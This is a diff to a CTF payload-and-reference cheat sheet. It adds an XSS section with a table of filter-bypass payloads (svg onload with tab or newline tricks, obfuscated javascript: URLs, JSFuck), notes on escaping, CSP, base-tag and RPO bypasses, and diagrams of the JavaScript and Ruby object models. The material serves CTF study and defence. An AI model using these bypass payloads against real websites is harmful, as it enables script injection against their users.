+- Browser-based side channel attack  
 
 ### XSS
+> [Cross-site scripting (XSS) cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
+
 - Type
   - Self-XSS
   - Reflected XSS
   - Stored XSS
 - Mitigation
-  - filter / escape
+  - Filter
+    | Pattern       | Bypass                                     |
+    |:--------------|:-------------------------------------------|
+    | [SPACE]on...= | <svg`<TAB>`onload=alert(1)>                |
+    | [SPACE]on...= | <svg`\n`onload=alert(1)>                   |
+    | [SPACE]on...= | <svg/ onload=alert(1)>                     |
+    | javascript:   | `<a href="\x01javascript:alert(1)">X</a>`  |
+    | javascript:   | `<a href="java\tscript:alert(1)">X</a>`    |
+    | javascript:   | `<a href="java&Tab;script:alert(1)">X</a>` |
+    | <script       | JSFuck                                     |
+  - Escape (HTML Entity)
+    | Symbol | Alternative |
+    |:-------|:------------|
+    | `<`    | `&lt;`      |
+    | `>`    | `&gt;`      |
+    | `"`    | `&quot;`    |
   - Content Security Policy (CSP)
     > [CSP Evaluator](https://csp-evaluator.withgoogle.com/)
-
     - script-src
     - Nonce
+  - trusted-types (Chrome)
   - HTTP response header
   - Define trusted resources
+  - HttpOnly
+- Bypass
+  - `<base>`
+    - Change base URL of all relative URL
+  - Relative Path Overwrite (RPO)
 - Case Study
   - [XS-Search abusing the Chrome XSS Auditor](https://www.youtube.com/watch?v=HcrQy0C-hEA)
+  - [Mutation XSS in Google Search](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
+  - [Breaking XSS mitigations via Script Gadgets](https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf)
 
 ### XXE (XML External Entity Injection)
 
@@ -1281,6 +1491,33 @@ This is a payload collection and references for CTF challenges.
   - [] == "0"
   - ['a', ['b', 'c']] == "a,b,c"
   - "b" + "a" + + "a" + "a" == baNaNa
+- Prototype Chain
+  ```
+  __proto__ 
+  ─────────>
+                                      
+         ┌─────────────────────────────┐ ┌───────────────────────────────────────────────────┐
+         │                             │ │                                                   │
+         │                             │ │                                                   │
+         │                             │ │                   ┌──────┐                        │
+         │                             │ │                   │ null │                        │
+         │                             │ │                   └──────┘                        │
+         │                             │ │                      ↑                            │
+         │                             ↓ ↓                      │                            │
+  ┌────────────┐    prototype┌────────────────────┐    ┌──────────────────┐  constructor┌──────────┐
+  │ Function() │─────────────│ Function.prototype │───>│ Object.prototype │─────────────│ Object() │
+  └────────────┘constructor  └────────────────────┘    └──────────────────┘prototype    └──────────┘
+                                        ↑                       ↑          
+                                        │                       │
+                                     ┌─────┐    prototype┌─────────────┐
+                                     │ A() │─────────────│ A.prototype │
+                                     └─────┘constructor  └─────────────┘
+                                                                ↑          
+                                                                │
+                                                           ┌─────────┐
+                                                           │ new A() │
+                                                           └─────────┘
+  ```
 
 ### PHP
 - Reference
@@ -1326,3 +1563,37 @@ This is a payload collection and references for CTF challenges.
 ### Python
 - Reference
   - [wtfpython](https://github.com/satwikkansal/wtfpython) 
+
+### Ruby
+- Object Model
+  ```
+  superclass
+  ──────────>
+
+      ┌──────────────────────────────────────────────────────────┐
+      │                                                          │
+      │                       ┌─────┐                            │
+      │                       │ nil │                            │
+      │                       └─────┘                            │
+      │                          ↑                               │
+      │                          │                               │
+      │                   ┌─────────────┐  singleton_class┌──────────────┐ 
+      │                   │ BasicObject │─────────────────│ #BasicObject │
+      │                   └─────────────┘                 └──────────────┘
+      │                          ↑                               ↑
+      ↓                          │                               │
+  ┌───────┐    ┌────────┐    ┌────────┐      singleton_class┌─────────┐
+  │ Class │───>│ Module │───>│ Object │─────────────────────│ #Object │
+  └───────┘    └────────┘    └────────┘                     └─────────┘
+                                 ↑                               ↑ 
+                                 │                               │
+                          class┌───┐            singleton_class┌────┐
+          ┌────────────────────│ A │───────────────────────────│ #A │
+          │                    └───┘                           └────┘
+          │                      ↑  
+          │                      │  
+        ┌───┐   singleton_class┌────┐
+        │ a │──────────────────│ #a │
+        └───┘                  └────┘
+
+  ```
